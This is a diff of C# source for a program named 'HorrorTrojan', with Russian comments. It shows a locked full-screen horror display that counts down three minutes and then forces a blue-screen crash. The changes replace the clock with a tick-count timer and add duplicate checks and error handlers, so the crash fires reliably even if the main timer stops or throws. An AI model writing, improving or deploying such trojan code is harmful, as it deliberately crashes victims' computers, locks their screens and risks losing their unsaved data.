@@ -13,10 +13,14 @@ namespace HorrorTrojan
         private System.Windows.Forms.Timer drawTimer = new System.Windows.Forms.Timer();
         private System.Windows.Forms.Timer topMostTimer = new System.Windows.Forms.Timer();
         private System.Windows.Forms.Timer protectTimer = new System.Windows.Forms.Timer();
-        private System.Windows.Forms.Timer forceBSODTimer = new System.Windows.Forms.Timer(); // Дополнительный таймер
+        private System.Windows.Forms.Timer forceBSODTimer = new System.Windows.Forms.Timer();
         private Random rnd = new Random();
-        private DateTime startTime;
-        private int maxSeconds = 180;
+        
+        // ===== СОБСТВЕННЫЙ ТАЙМЕР =====
+        private int startTick;              // Время старта в миллисекундах
+        private int maxSeconds = 180;       // 3 минуты
+        private int maxMilliseconds;        // 180 * 1000
+        
         private int bloodLevel = 100;
         private Image horrorImage;
         private int indicatorWidth = 25;
@@ -47,6 +51,9 @@ namespace HorrorTrojan
             this.DoubleBuffered = true;
             this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.Opaque, true);
             InitializeMusic();
+            
+            // Инициализация собственного таймера
+            maxMilliseconds = maxSeconds * 1000;
         }
 
         private void InitializeComponent()
@@ -214,26 +221,46 @@ namespace HorrorTrojan
 
         private void MainInterface_Load(object sender, EventArgs e)
         {
-            startTime = DateTime.Now;
+            // ===== ЗАПУСКАЕМ СОБСТВЕННЫЙ ТАЙМЕР =====
+            startTick = Environment.TickCount;
+            if (startTick < 0) startTick = 0;  // Защита от переполнения
             
             protectTimer.Start();
             Thread.Sleep(200);
             SetupFullProtection();
             bloodTimer.Start();
             drawTimer.Start();
-            forceBSODTimer.Start(); // Дополнительный таймер для надежности
+            forceBSODTimer.Start();
             PlayMusic();
+        }
+
+        // ===== ПОЛУЧЕНИЕ ТЕКУЩЕГО ВРЕМЕНИ В МИЛЛИСЕКУНДАХ =====
+        private int GetElapsedMilliseconds()
+        {
+            int currentTick = Environment.TickCount;
+            int elapsed = currentTick - startTick;
+            
+            // Защита от переполнения (TickCount сбрасывается через 49.7 дней)
+            if (elapsed < 0 || elapsed > maxMilliseconds + 10000)
+            {
+                // Если время сбросилось или превысило максимум - фиксируем
+                startTick = currentTick;
+                return 0;
+            }
+            
+            return elapsed;
         }
 
         private void BloodTimer_Tick(object sender, EventArgs e)
         {
             try
             {
-                TimeSpan elapsed = DateTime.Now - startTime;
-                double elapsedSeconds = elapsed.TotalSeconds;
+                // ===== ИСПОЛЬЗУЕМ СОБСТВЕННЫЙ ТАЙМЕР =====
+                int elapsedMilliseconds = GetElapsedMilliseconds();
+                double elapsedSeconds = elapsedMilliseconds / 1000.0;
                 
-                // Проверка на BSOD
-                if (elapsedSeconds >= maxSeconds && !timerCompleted)
+                // Проверка на BSOD (180 секунд)
+                if (elapsedMilliseconds >= maxMilliseconds && !timerCompleted)
                 {
                     lock (timerLock)
                     {
@@ -255,7 +282,7 @@ namespace HorrorTrojan
                 // Расчет уровня крови (только если не завершен)
                 if (!timerCompleted)
                 {
-                    double percent = (elapsedSeconds / maxSeconds) * 100.0;
+                    double percent = (elapsedMilliseconds / (double)maxMilliseconds) * 100.0;
                     if (percent > 100) percent = 100;
                     if (percent < 0) percent = 0;
                     
@@ -272,7 +299,6 @@ namespace HorrorTrojan
             }
             catch
             {
-                // При ошибке пробуем вызвать BSOD
                 TriggerBSOD();
             }
         }
@@ -281,10 +307,11 @@ namespace HorrorTrojan
         {
             try
             {
-                TimeSpan elapsed = DateTime.Now - startTime;
+                // ===== ДУБЛИРУЮЩАЯ ПРОВЕРКА =====
+                int elapsedMilliseconds = GetElapsedMilliseconds();
                 
                 // Дополнительная проверка каждую секунду
-                if (elapsed.TotalSeconds >= maxSeconds && !timerCompleted && !bsodTriggered)
+                if (elapsedMilliseconds >= maxMilliseconds && !timerCompleted && !bsodTriggered)
                 {
                     lock (timerLock)
                     {
@@ -305,13 +332,11 @@ namespace HorrorTrojan
                 // Проверка, что bloodTimer жив
                 if (!bloodTimer.Enabled && !timerCompleted && !bsodTriggered)
                 {
-                    // Если bloodTimer остановлен, но BSOD еще не вызван - перезапускаем
                     try { bloodTimer.Start(); } catch { }
                 }
             }
             catch
             {
-                // При ошибке пробуем вызвать BSOD
                 if (!bsodTriggered && !timerCompleted)
                 {
                     TriggerBSOD();
